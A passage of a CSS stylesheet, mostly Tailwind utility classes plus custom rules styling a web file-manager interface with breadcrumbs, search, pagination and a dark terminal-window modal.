scaleY(var(--tw-scale-y))}.scale-95{--tw-scale-x:.95;--tw-scale-y:.95}.transform{transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.cursor-pointer{cursor:pointer}.select-none{-webkit-user-select:none;-moz-user-select:none;user-select:none}.select-text{-webkit-user-select:text;-moz-user-select:text;user-select:text}.resize-none{resize:none}.grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}.flex-col{flex-direction:column}.flex-wrap{flex-wrap:wrap}.items-start{align-items:flex-start}.items-center{align-items:center}.justify-end{justify-content:flex-end}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-0\.5{gap:.125rem}.gap-1{gap:.25rem}.gap-1\.5{gap:.375rem}.gap-2{gap:.5rem}.gap-2\.5{gap:.625rem}.gap-3{gap:.75rem}.gap-4{gap:1rem}.gap-x-6{-moz-column-gap:1.5rem;column-gap:1.5rem}.gap-y-1{row-gap:.25rem}.gap-y-1\.5{row-gap:.375rem}.space-y-4>:not([hidden])~:not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1rem*(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1rem*var(--tw-space-y-reverse))}.divide-y>:not([hidden])~:not([hidden]){--tw-divide-y-reverse:0;border-top-width:calc(1px*(1 - var(--tw-divide-y-reverse)));border-bottom-width:calc(1px*var(--tw-divide-y-reverse))}.divide-zinc-200>:not([hidden])~:not([hidden]){--tw-divide-opacity:1;border-color:rgb(228 228 231/var(--tw-divide-opacity,1))}.overflow-auto{overflow:auto}.overflow-hidden{overflow:hidden}.overflow-x-auto{overflow-x:auto}.overflow-y-auto{overflow-y:auto}.truncate{overflow:hidden;text-overflow:ellipsis}.truncate,.whitespace-nowrap{white-space:nowrap}.whitespace-pre-wrap{white-space:pre-wrap}.break-words{overflow-wrap:break-word}.break-all{word-break:break-all}.rounded{border-radius:.25rem}.rounded-2xl{border-radius:1rem}.rounded-\[3px\]{border-radius:3px}.rounded-full{border-radius:9999px}.rounded-lg{border-radius:.5rem}.rounded-md{border-radius:.375rem}.rounded-xl{border-radius:.75rem}.border{border-width:1px}.border-b{border-bottom-width:1px}.border-r{border-right-width:1px}.border-t{border-top-width:1px}.border-dashed{border-style:dashed}.border-border{--tw-border-opacity:1;border-color:rgb(228 228 231/var(--tw-border-opacity,1))}.border-green-200{--tw-border-opacity:1;border-color:rgb(187 247 208/var(--tw-border-opacity,1))}.border-red-200{--tw-border-opacity:1;border-color:rgb(254 202 202/var(--tw-border-opacity,1))}.border-zinc-100{--tw-border-opacity:1;border-color:rgb(244 244 245/var(--tw-border-opacity,1))}.border-zinc-200{--tw-border-opacity:1;border-color:rgb(228 228 231/var(--tw-border-opacity,1))}.border-zinc-300{--tw-border-opacity:1;border-color:rgb(212 212 216/var(--tw-border-opacity,1))}.border-zinc-50{--tw-border-opacity:1;border-color:rgb(250 250 250/var(--tw-border-opacity,1))}.border-zinc-700{--tw-border-opacity:1;border-color:rgb(63 63 70/var(--tw-border-opacity,1))}.border-zinc-700\/50{border-color:rgba(63,63,70,.5)}.border-zinc-800{--tw-border-opacity:1;border-color:rgb(39 39 42/var(--tw-border-opacity,1))}.border-zinc-800\/50{border-color:rgba(39,39,42,.5)}.border-zinc-900{--tw-border-opacity:1;border-color:rgb(24 24 27/var(--tw-border-opacity,1))}.bg-\[\#18181b\]{--tw-bg-opacity:1;background-color:rgb(24 24 27/var(--tw-bg-opacity,1))}.bg-\[\#27272a\]{--tw-bg-opacity:1;background-color:rgb(39 39 42/var(--tw-bg-opacity,1))}.bg-bg{--tw-bg-opacity:1;background-color:rgb(244 244 245/var(--tw-bg-opacity,1))}.bg-blue-500{--tw-bg-opacity:1;background-color:rgb(59 130 246/var(--tw-bg-opacity,1))}.bg-green-100{--tw-bg-opacity:1;background-color:rgb(220 252 231/var(--tw-bg-opacity,1))}.bg-green-400{--tw-bg-opacity:1;background-color:rgb(74 222 128/var(--tw-bg-opacity,1))}.bg-green-50{--tw-bg-opacity:1;background-color:rgb(240 253 244/var(--tw-bg-opacity,1))}.bg-green-500\/50{background-color:rgba(34,197,94,.5)}.bg-red-100{--tw-bg-opacity:1;background-color:rgb(254 226 226/var(--tw-bg-opacity,1))}.bg-red-50{--tw-bg-opacity:1;background-color:rgb(254 242 242/var(--tw-bg-opacity,1))}.bg-red-500\/50{background-color:rgba(239,68,68,.5)}.bg-surface{--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity,1))}.bg-transparent{background-color:transparent}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity,1))}.bg-white\/60{background-color:hsla(0,0%,100%,.6)}.bg-yellow-500\/50{background-color:rgba(234,179,8,.5)}.bg-zinc-100{--tw-bg-opacity:1;background-color:rgb(244 244 245/var(--tw-bg-opacity,1))}.bg-zinc-200{--tw-bg-opacity:1;background-color:rgb(228 228 231/var(--tw-bg-opacity,1))}.bg-zinc-200\/50{background-color:hsla(240,6%,90%,.5)}.bg-zinc-300{--tw-bg-opacity:1;background-color:rgb(212 212 216/var(--tw-bg-opacity,1))}.bg-zinc-50{--tw-bg-opacity:1;background-color:rgb(250 250 250/var(--tw-bg-opacity,1))}.bg-zinc-700{--tw-bg-opacity:1;background-color:rgb(63 63 70/var(--tw-bg-opacity,1))}.bg-zinc-900{--tw-bg-opacity:1;background-color:rgb(24 24 27/var(--tw-bg-opacity,1))}.bg-zinc-900\/95{background-color:rgba(24,24,27,.95)}.p-0\.5{padding:.125rem}.p-1{padding:.25rem}.p-2{padding:.5rem}.p-2\.5{padding:.625rem}.p-3{padding:.75rem}.p-4{padding:1rem}.p-5{padding:1.25rem}.px-1{padding-left:.25rem;padding-right:.25rem}.px-1\.5{padding-left:.375rem;padding-right:.375rem}.px-2{padding-left:.5rem;padding-right:.5rem}.px-2\.5{padding-left:.625rem;padding-right:.625rem}.px-3{padding-left:.75rem;padding-right:.75rem}.px-4{padding-left:1rem;padding-right:1rem}.py-0\.5{padding-top:.125rem;padding-bottom:.125rem}.py-1{padding-top:.25rem;padding-bottom:.25rem}.py-1\.5{padding-top:.375rem;padding-bottom:.375rem}.py-2{padding-top:.5rem;padding-bottom:.5rem}.py-2\.5{padding-top:.625rem;padding-bottom:.625rem}.py-6{padding-top:1.5rem;padding-bottom:1.5rem}.pb-1\.5{padding-bottom:.375rem}.pb-24{padding-bottom:6rem}.pb-3{padding-bottom:.75rem}.pl-2{padding-left:.5rem}.pl-2\.5{padding-left:.625rem}.pl-8{padding-left:2rem}.pr-10{padding-right:2.5rem}.pr-2{padding-right:.5rem}.text-left{text-align:left}.text-center{text-align:center}.text-right{text-align:right}.font-mono{font-family:JetBrains Mono,monospace}.font-sans{font-family:Inter,sans-serif}.text-\[10px\]{font-size:10px}.text-\[11px\]{font-size:11px}.text-\[8px\]{font-size:8px}.text-\[9px\]{font-size:9px}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-sm{font-size:.875rem;line-height:1.25rem}.text-xs{font-size:.75rem;line-height:1rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.font-normal{font-weight:400}.font-semibold{font-weight:600}.uppercase{text-transform:uppercase}.leading-relaxed{line-height:1.625}.leading-tight{line-height:1.25}.tracking-tight{letter-spacing:-.025em}.tracking-wide{letter-spacing:.025em}.tracking-wider{letter-spacing:.05em}.text-blue-400{--tw-text-opacity:1;color:rgb(96 165 250/var(--tw-text-opacity,1))}.text-blue-500{--tw-text-opacity:1;color:rgb(59 130 246/var(--tw-text-opacity,1))}.text-green-400{--tw-text-opacity:1;color:rgb(74 222 128/var(--tw-text-opacity,1))}.text-green-500{--tw-text-opacity:1;color:rgb(34 197 94/var(--tw-text-opacity,1))}.text-green-600{--tw-text-opacity:1;color:rgb(22 163 74/var(--tw-text-opacity,1))}.text-green-700{--tw-text-opacity:1;color:rgb(21 128 61/var(--tw-text-opacity,1))}.text-red-400{--tw-text-opacity:1;color:rgb(248 113 113/var(--tw-text-opacity,1))}.text-red-600{--tw-text-opacity:1;color:rgb(220 38 38/var(--tw-text-opacity,1))}.text-red-700{--tw-text-opacity:1;color:rgb(185 28 28/var(--tw-text-opacity,1))}.text-red-700\/80{color:rgba(185,28,28,.8)}.text-white{--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity,1))}.text-yellow-500{--tw-text-opacity:1;color:rgb(234 179 8/var(--tw-text-opacity,1))}.text-zinc-100{--tw-text-opacity:1;color:rgb(244 244 245/var(--tw-text-opacity,1))}.text-zinc-300{--tw-text-opacity:1;color:rgb(212 212 216/var(--tw-text-opacity,1))}.text-zinc-400{--tw-text-opacity:1;color:rgb(161 161 170/var(--tw-text-opacity,1))}.text-zinc-500{--tw-text-opacity:1;color:rgb(113 113 122/var(--tw-text-opacity,1))}.text-zinc-600{--tw-text-opacity:1;color:rgb(82 82 91/var(--tw-text-opacity,1))}.text-zinc-700{--tw-text-opacity:1;color:rgb(63 63 70/var(--tw-text-opacity,1))}.text-zinc-800{--tw-text-opacity:1;color:rgb(39 39 42/var(--tw-text-opacity,1))}.text-zinc-900{--tw-text-opacity:1;color:rgb(24 24 27/var(--tw-text-opacity,1))}.antialiased{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.placeholder-zinc-400::-moz-placeholder{--tw-placeholder-opacity:1;color:rgb(161 161 170/var(--tw-placeholder-opacity,1))}.placeholder-zinc-400::placeholder{--tw-placeholder-opacity:1;color:rgb(161 161 170/var(--tw-placeholder-opacity,1))}.placeholder-zinc-500::-moz-placeholder{--tw-placeholder-opacity:1;color:rgb(113 113 122/var(--tw-placeholder-opacity,1))}.placeholder-zinc-500::placeholder{--tw-placeholder-opacity:1;color:rgb(113 113 122/var(--tw-placeholder-opacity,1))}.opacity-0{opacity:0}.opacity-100{opacity:1}.opacity-50{opacity:.5}.shadow-2xl{--tw-shadow:0 25px 50px -12px rgba(0,0,0,.25);--tw-shadow-colored:0 25px 50px -12px var(--tw-shadow-color)}.shadow-2xl,.shadow-\[0_0_6px_rgba\(74\2c 222\2c 128\2c 0\.4\)\]{box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.shadow-\[0_0_6px_rgba\(74\2c 222\2c 128\2c 0\.4\)\]{--tw-shadow:0 0 6px rgba(74,222,128,.4);--tw-shadow-colored:0 0 6px var(--tw-shadow-color)}.shadow-inner{--tw-shadow:inset 0 2px 4px 0 rgba(0,0,0,.05);--tw-shadow-colored:inset 0 2px 4px 0 var(--tw-shadow-color)}.shadow-inner,.shadow-lg{box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.shadow-lg{--tw-shadow:0 10px 15px -3px rgba(0,0,0,.1),0 4px 6px -4px rgba(0,0,0,.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color),0 4px 6px -4px var(--tw-shadow-color)}.shadow-md{--tw-shadow:0 4px 6px -1px rgba(0,0,0,.1),0 2px 4px -2px rgba(0,0,0,.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color),0 2px 4px -2px var(--tw-shadow-color)}.shadow-md,.shadow-sm{box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.shadow-sm{--tw-shadow:0 1px 2px 0 rgba(0,0,0,.05);--tw-shadow-colored:0 1px 2px 0 var(--tw-shadow-color)}.outline-none{outline:2px solid transparent;outline-offset:2px}.ring-1{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0 #0000)}.ring-zinc-900\/5{--tw-ring-color:rgba(24,24,27,.05)}.backdrop-blur-md{--tw-backdrop-blur:blur(12px)}.backdrop-blur-md,.backdrop-blur-sm{-webkit-backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}.backdrop-blur-sm{--tw-backdrop-blur:blur(4px)}.transition{transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,-webkit-backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter;transition-property:color,background-color,border-color,text-decoration-color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter,-webkit-backdrop-filter;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.transition-colors{transition-property:color,background-color,border-color,text-decoration-color,fill,stroke;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.transition-transform{transition-property:transform;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.duration-300{transition-duration:.3s}.ease-\[cubic-bezier\(0\.16\2c 1\2c 0\.3\2c 1\)\]{transition-timing-function:cubic-bezier(.16,1,.3,1)}.last\:border-0:last-child{border-width:0}.checked\:border-zinc-900:checked{--tw-border-opacity:1;border-color:rgb(24 24 27/var(--tw-border-opacity,1))}.checked\:bg-zinc-900:checked{--tw-bg-opacity:1;background-color:rgb(24 24 27/var(--tw-bg-opacity,1))}.hover\:border-zinc-300:hover{--tw-border-opacity:1;border-color:rgb(212 212 216/var(--tw-border-opacity,1))}.hover\:border-zinc-400:hover{--tw-border-opacity:1;border-color:rgb(161 161 170/var(--tw-border-opacity,1))}.hover\:bg-red-50:hover{--tw-bg-opacity:1;background-color:rgb(254 242 242/var(--tw-bg-opacity,1))}.hover\:bg-zinc-100:hover{--tw-bg-opacity:1;background-color:rgb(244 244 245/var(--tw-bg-opacity,1))}.hover\:bg-zinc-200:hover{--tw-bg-opacity:1;background-color:rgb(228 228 231/var(--tw-bg-opacity,1))}.hover\:bg-zinc-50:hover{--tw-bg-opacity:1;background-color:rgb(250 250 250/var(--tw-bg-opacity,1))}.hover\:bg-zinc-800:hover{--tw-bg-opacity:1;background-color:rgb(39 39 42/var(--tw-bg-opacity,1))}.hover\:text-black:hover{--tw-text-opacity:1;color:rgb(0 0 0/var(--tw-text-opacity,1))}.hover\:text-blue-400:hover{--tw-text-opacity:1;color:rgb(96 165 250/var(--tw-text-opacity,1))}.hover\:text-blue-500:hover{--tw-text-opacity:1;color:rgb(59 130 246/var(--tw-text-opacity,1))}.hover\:text-green-400:hover{--tw-text-opacity:1;color:rgb(74 222 128/var(--tw-text-opacity,1))}.hover\:text-red-400:hover{--tw-text-opacity:1;color:rgb(248 113 113/var(--tw-text-opacity,1))}.hover\:text-red-600:hover{--tw-text-opacity:1;color:rgb(220 38 38/var(--tw-text-opacity,1))}.hover\:text-white:hover{--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity,1))}.hover\:text-yellow-400:hover{--tw-text-opacity:1;color:rgb(250 204 21/var(--tw-text-opacity,1))}.hover\:text-zinc-200:hover{--tw-text-opacity:1;color:rgb(228 228 231/var(--tw-text-opacity,1))}.hover\:text-zinc-700:hover{--tw-text-opacity:1;color:rgb(63 63 70/var(--tw-text-opacity,1))}.hover\:text-zinc-800:hover{--tw-text-opacity:1;color:rgb(39 39 42/var(--tw-text-opacity,1))}.hover\:text-zinc-900:hover{--tw-text-opacity:1;color:rgb(24 24 27/var(--tw-text-opacity,1))}.focus\:border-zinc-900:focus{--tw-border-opacity:1;border-color:rgb(24 24 27/var(--tw-border-opacity,1))}.focus\:bg-white:focus{--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity,1))}.focus\:outline-none:focus{outline:2px solid transparent;outline-offset:2px}.focus\:ring-0:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(var(--tw-ring-offset-width)) var(--tw-ring-color)}.focus\:ring-0:focus,.focus\:ring-1:focus{box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0 #0000)}.focus\:ring-1:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color)}.focus\:ring-zinc-900:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(24 24 27/var(--tw-ring-opacity,1))}.focus\:ring-offset-0:focus{--tw-ring-offset-width:0px}.active\:scale-95:active{--tw-scale-x:.95;--tw-scale-y:.95;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.active\:bg-zinc-100:active{--tw-bg-opacity:1;background-color:rgb(244 244 245/var(--tw-bg-opacity,1))}@keyframes spin{to{transform:rotate(1turn)}}.group:hover .group-hover\:animate-spin{animation:spin 1s linear infinite}.group:hover .group-hover\:border-zinc-100{--tw-border-opacity:1;border-color:rgb(244 244 245/var(--tw-border-opacity,1))}.group:hover .group-hover\:text-black{--tw-text-opacity:1;color:rgb(0 0 0/var(--tw-text-opacity,1))}.group:hover .group-hover\:text-zinc-600{--tw-text-opacity:1;color:rgb(82 82 91/var(--tw-text-opacity,1))}.group:hover .group-hover\:text-zinc-800{--tw-text-opacity:1;color:rgb(39 39 42/var(--tw-text-opacity,1))}@media (min-width:640px){.sm\:left-auto{left:auto}.sm\:right-8{right:2rem}.sm\:mx-0{margin-right:0}.sm\:ml-0,.sm\:mx-0{margin-left:0}.sm\:block{display:block}.sm\:inline{display:inline}.sm\:h-4{height:1rem}.sm\:h-auto{height:auto}.sm\:w-24{width:6rem}.sm\:w-auto{width:auto}.sm\:max-w-\[300px\]{max-width:300px}.sm\:max-w-xs{max-width:20rem}.sm\:flex-1{flex:1 1 0%}.sm\:flex-none{flex:none}.sm\:translate-x-0{--tw-translate-x:0px;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.sm\:flex-row{flex-direction:row}.sm\:flex-nowrap{flex-wrap:nowrap}.sm\:items-center{align-items:center}.sm\:gap-1\.5{gap:.375rem}.sm\:gap-2{gap:.5rem}.sm\:gap-3{gap:.75rem}.sm\:rounded-lg{border-radius:.5rem}.sm\:rounded-none{border-radius:0}.sm\:p-2\.5{padding:.625rem}.sm\:px-0{padding-left:0;padding-right:0}.sm\:py-8{padding-top:2rem;padding-bottom:2rem}.sm\:pr-3{padding-right:.75rem}.sm\:text-xs{font-size:.75rem;line-height:1rem}.sm\:hover\:bg-transparent:hover{background-color:transparent}.sm\:active\:scale-100:active{--tw-scale-x:1;--tw-scale-y:1;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}}@media (min-width:768px){.md\:min-h-0{min-height:0}.md\:grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}}
.font-sans{font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif}
.font-mono{font-family:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}
body{background:#f4f4f5}
.scrollbar-none{scrollbar-width:none}
.scrollbar-none::-webkit-scrollbar{display:none}
.scrollbar-thin{scrollbar-width:thin}
.scrollbar-thin::-webkit-scrollbar{width:6px;height:6px}
.scrollbar-thin::-webkit-scrollbar-thumb{background:#3f3f46;border-radius:4px}
.fm-path-bar{justify-content:space-between;gap:8px;flex-wrap:nowrap}
.fm-crumbs{display:flex;align-items:center;flex-wrap:nowrap;gap:1px;min-width:0;flex:1 1 auto;max-width:100%;overflow:hidden}
.fm-crumbs>i{flex:0 0 auto}
.fm-crumb-unit{display:inline-flex;align-items:center;min-width:0;max-width:100%;flex:0 0 auto}
.fm-crumb-unit.fm-crumb-shrink{flex:0 1 auto;min-width:0}
.fm-crumb-unit.hidden{display:none}
.fm-crumb-unit a{display:inline-block;max-width:100%;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.fm-crumbs>a{display:inline-block;max-width:100%;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.fm-crumb-sep{color:#d4d4d8;font-size:10px;user-select:none}
.fm-crumb-gap{color:#a1a1aa;padding:0 4px;user-select:none}
.fm-search{display:flex;align-items:center;gap:6px;flex:0 0 300px;min-width:0}
.fm-search-inline{flex:0 0 300px}
.fm-pg-nums{display:flex;align-items:center;gap:2px}
.fm-pg-num{padding:0 5px;font-family:"JetBrains Mono",ui-monospace,monospace}
.fm-pg-btn.is-current{background:#18181b;border-color:#18181b;color:#fff;cursor:default;opacity:1;font-weight:600}
.fm-pg-btn.is-current:hover{background:#18181b;border-color:#18181b;color:#fff}
.fm-pg-gap{min-width:16px;text-align:center;color:#a1a1aa;font-size:9px;user-select:none}
.fm-search-field{position:relative;flex:1 1 auto;min-width:0}
.fm-search-field>i{position:absolute;left:9px;top:50%;transform:translateY(-50%);color:#a1a1aa;font-size:11px;pointer-events:none}
.fm-search input[type=text]{display:block;width:100%;height:30px;padding:0 30px 0 28px;background:#fff;border:1px solid #e4e4e7;border-radius:6px;font-size:11px;font-weight:500;color:#27272a;outline:none;transition:border-color .15s,box-shadow .15s,background .15s}
.fm-search input[type=text]::placeholder{color:#a1a1aa;font-weight:400}
.fm-search input[type=text]:focus{border-color:#18181b;box-shadow:0 0 0 3px rgba(24,24,27,.06)}
.fm-search-kbd{position:absolute;right:7px;top:50%;transform:translateY(-50%);min-width:16px;height:16px;padding:0 4px;display:inline-flex;align-items:center;justify-content:center;border:1px solid #e4e4e7;border-radius:3px;background:#fafafa;color:#a1a1aa;font-family:"JetBrains Mono",ui-monospace,monospace;font-size:9px;line-height:1;pointer-events:none}
.fm-search-submit{height:30px;padding:0 12px;border:1px solid #18181b;border-radius:6px;background:#18181b;color:#fff;font-size:10px;font-weight:600;cursor:pointer;white-space:nowrap;transition:background .15s,border-color .15s}
.fm-search-submit:hover{background:#3f3f46;border-color:#3f3f46}
.fm-search-clear{height:30px;padding:0 2px;border:0;background:transparent;color:#71717a;font-size:10px;font-weight:500;cursor:pointer;white-space:nowrap}
.fm-search-clear:hover{color:#18181b}
.fm-list-foot{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;padding:8px 10px;background:#fafafa;border-top:1px solid #e4e4e7;font-size:9px;color:#71717a}
.fm-list-foot .fm-server{display:flex;align-items:center;gap:6px;min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.fm-list-foot .fm-server b{font-size:8px;color:#a1a1aa;text-transform:uppercase;letter-spacing:.12em;font-weight:700}
.fm-list-foot .fm-server span{font-family:"JetBrains Mono",ui-monospace,monospace;color:#52525b;overflow:hidden;text-overflow:ellipsis}
.fm-pager{display:flex;align-items:center;gap:8px;flex-wrap:wrap;justify-content:flex-end;min-width:0}
.fm-pg-count{font-family:"JetBrains Mono",ui-monospace,monospace;font-size:9px;color:#a1a1aa;white-space:nowrap}
.fm-pg-control{display:flex;align-items:center;height:28px;padding:2px;border:1px solid #e4e4e7;border-radius:6px;background:#fff;box-shadow:0 1px 2px rgba(24,24,27,.03)}
.fm-pg-btn{height:24px;min-width:24px;padding:0 6px;display:inline-flex;align-items:center;justify-content:center;gap:3px;border:0;border-radius:4px;background:transparent;color:#71717a;font-size:9px;font-weight:600;font-variant-numeric:tabular-nums;cursor:pointer;transition:background .15s,color .15s,opacity .15s}
.fm-pg-btn i{font-size:9px;color:#a1a1aa}
.fm-pg-btn:hover:not(:disabled){background:#f4f4f5;color:#18181b}
.fm-pg-btn:hover:not(:disabled) i{color:#18181b}
.fm-pg-btn:disabled{opacity:.3;cursor:default}
.fm-pg-nums{display:flex;align-items:center;gap:1px}
.fm-pg-num{font-family:"JetBrains Mono",ui-monospace,monospace}
.fm-pg-btn.is-current{background:#18181b;color:#fff;cursor:default;box-shadow:0 1px 2px rgba(24,24,27,.18)}
.fm-pg-btn.is-current:hover{background:#18181b;color:#fff}
.fm-pg-gap{min-width:16px;text-align:center;color:#c4c4c8;font-size:9px;user-select:none}
.fm-pg-jump{display:flex;align-items:center;gap:3px;height:28px;padding:2px;border:1px solid #e4e4e7;border-radius:6px;background:#fff;box-shadow:0 1px 2px rgba(24,24,27,.03)}
.fm-pg-jump input[type=number]{width:32px;height:24px;padding:0;border:0;border-radius:4px;background:#f4f4f5;color:#18181b;text-align:center;font-family:"JetBrains Mono",ui-monospace,monospace;font-size:10px;font-weight:600;outline:none;appearance:textfield;-moz-appearance:textfield;transition:background .15s,box-shadow .15s}
.fm-pg-jump input[type=number]:hover{background:#ececee}
.fm-pg-jump input[type=number]:focus{background:#fff;box-shadow:inset 0 0 0 1px #d4d4d8}
.fm-pg-jump input[type=number]::-webkit-outer-spin-button,.fm-pg-jump input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none;margin:0}
.fm-pg-jump .fm-pg-of{padding:0 1px;color:#a1a1aa;font-family:"JetBrains Mono",ui-monospace,monospace;font-size:9px;white-space:nowrap}
.fm-pg-jump .fm-pg-go{height:24px;margin-left:1px;padding:0 8px;border:0;border-radius:4px;background:#18181b;color:#fff;font-family:Inter,ui-sans-serif,system-ui,sans-serif;font-size:9px;font-weight:600;cursor:pointer;transition:background .15s}
.fm-pg-jump .fm-pg-go:hover{background:#3f3f46}
.fm-empty-cell{padding:0!important}
.fm-empty{padding:44px 18px;text-align:center;background:linear-gradient(180deg,#fff,#fafafa)}
.fm-empty .fm-empty-ico{width:38px;height:38px;margin:0 auto 10px;display:flex;align-items:center;justify-content:center;border:1px solid #e4e4e7;border-radius:9px;background:#fff;color:#a1a1aa;box-shadow:0 1px 2px rgba(24,24,27,.04);font-size:16px}
.fm-empty .fm-empty-title{font-size:12px;font-weight:600;color:#3f3f46;letter-spacing:-.01em}
.fm-empty .fm-empty-title span{font-family:"JetBrains Mono",ui-monospace,monospace;font-size:10px;color:#18181b;background:#f4f4f5;border:1px solid #e4e4e7;border-radius:4px;padding:1px 5px}
.fm-empty .fm-empty-sub{margin-top:3px;font-size:10px;color:#a1a1aa}
.fm-empty .fm-empty-btn{margin-top:12px;height:26px;padding:0 10px;border:1px solid #d4d4d8;border-radius:5px;background:#fff;color:#52525b;font-size:9px;font-weight:600;cursor:pointer}
.fm-empty .fm-empty-btn:hover{background:#f4f4f5;color:#18181b;border-color:#a1a1aa}
.term-backdrop{background:rgba(8,10,15,.66);backdrop-filter:blur(7px);-webkit-backdrop-filter:blur(7px)}
.term-window{position:relative;width:100%;max-width:800px;max-height:86vh;display:flex;flex-direction:column;overflow:hidden;border:1px solid #30363d;border-radius:10px;background:#0b0e14;box-shadow:0 30px 80px -20px rgba(0,0,0,.8),0 0 0 1px rgba(255,255,255,.035) inset;color:#c9d1d9;font-family:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;font-size:11px;line-height:1.65;color-scheme:dark}
.term-chrome{display:flex;align-items:center;gap:10px;flex:0 0 auto;padding:8px 10px 8px 12px;background:#11161f;border-bottom:1px solid #21262d}
.term-lights{display:flex;gap:6px;flex:0 0 auto}
.term-lights i{display:block;width:9px;height:9px;border-radius:50%;background:#3b4048;border:1px solid rgba(0,0,0,.25)}
.term-lights i:nth-child(1){background:#ff5f57}
.term-lights i:nth-child(2){background:#febc2e}
.term-lights i:nth-child(3){background:#28c840}
.term-title{flex:1 1 auto;min-width:0;text-align:center;color:#9aa4b2;font-size:9px;letter-spacing:.03em;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.term-close{flex:0 0 auto;width:24px;height:24px;display:inline-flex;align-items:center;justify-content:center;border:1px solid transparent;border-radius:4px;background:transparent;color:#8b949e;font-size:11px;cursor:pointer;transition:background .15s,color .15s,border-color .15s}
.term-close:hover{background:#21262d;border-color:#30363d;color:#e6edf3}
.term-body{flex:1 1 auto;min-height:0;overflow-y:auto;padding:15px 17px 20px;background:radial-gradient(120% 85% at 50% 0%,rgba(63,185,80,.04),transparent 58%),#0b0e14;scrollbar-width:thin;scrollbar-color:#30363d transparent}
.term-body::-webkit-scrollbar{width:8px;height:8px}
.term-body::-webkit-scrollbar-thumb{background:#30363d;border-radius:5px}
.term-body::-webkit-scrollbar-track{background:transparent}
.term-banner{margin:2px 0 0;color:#9aa4b2;font-size:10px;white-space:pre-wrap}
.term-section{margin-top:17px}
